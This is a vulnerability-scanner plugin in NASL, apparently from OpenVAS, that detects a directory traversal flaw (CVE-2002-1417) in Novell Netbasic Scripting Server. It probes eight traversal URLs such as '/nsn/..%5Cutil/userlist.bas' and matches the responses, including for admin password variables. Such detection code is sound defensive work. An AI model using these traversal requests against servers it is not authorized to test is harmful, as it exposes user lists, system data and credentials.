# SPDX-FileCopyrightText: 2004 David Kyger
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12050");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5523");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2002-1417");
  script_name("Novell Netbasic Scripting Server Directory Traversal");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2004 David Kyger");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Apply the relevant patch and remove all default files from their
  respective directories.");

  script_tag(name:"summary", value:"Novell Netbasic Scripting Server is prone to a directory traversal vulnerability.");

  script_tag(name:"insight", value:"It is possible to escape out of the root directory of the scripting server by
  substituting a forward or backward slash for %5C. As a result, system
  information, such as environment and user information, could be obtained from
  the Netware server.

  Example: http://example.com/nsn/..%5Cutil/userlist.bas");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

flag = FALSE;

warning = string("The following Novell scripts can be executed on the server:");

port = http_get_port(default:80);

pat1 = "Statistics for volume";
pat2 = "used by files";
pat3 = "Novell Script For NetWare";
pat4 = "Directory Of";
pat5 = "====================================================";
pat6 = "User:";
pat7 = "Media Type";
pat8 = "Interrupt Secondary";
pat9 = "SYS:NSN\\WEB\\";
pat10 = "SYS:NSN\\TEMP\\";
pat11 = "NOT-LOGGED-IN";
pat12 = "--------------";
pat13 = "ADMSERV_ROOT";
pat14 = "ADMSERV_PWD";
pat15 = "Directory Listing Tool";
pat16 = "Server Name";

fl[0] = "/nsn/..%5Cutil/chkvol.bas";
fl[1] = "/nsn/..%5Cutil/dir.bas";
fl[2] = "/nsn/..%5Cutil/glist.bas";
fl[3] = "/nsn/..%5Cutil/lancard.bas";
fl[4] = "/nsn/..%5Cutil/set.bas";
fl[5] = "/nsn/..%5Cutil/userlist.bas";
fl[6] = "/nsn/..%5Cweb/env.bas";
fl[7] = "/nsn/..%5Cwebdemo/fdir.bas";

for(i=0; fl[i]; i++) {

  req = http_get(item:fl[i], port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if(!buf)
   continue;

  if ((pat1 >< buf && pat2 >< buf) || (pat3 >< buf && pat4 >< buf) || (pat5 >< buf && pat6 >< buf) || (pat7 >< buf && pat8 >< buf) || (pat9 >< buf && pat10 >< buf) || (pat11 >< buf && pat12 >< buf) || (pat13 >< buf && pat14 >< buf) || (pat15 >< buf && pat16 >< buf)) {
    warning = warning + string("\n", fl[i]);
    flag = TRUE;
  }
}

if (flag) {
  security_message(port:port, data:warning);
} else {
  exit(0);
}
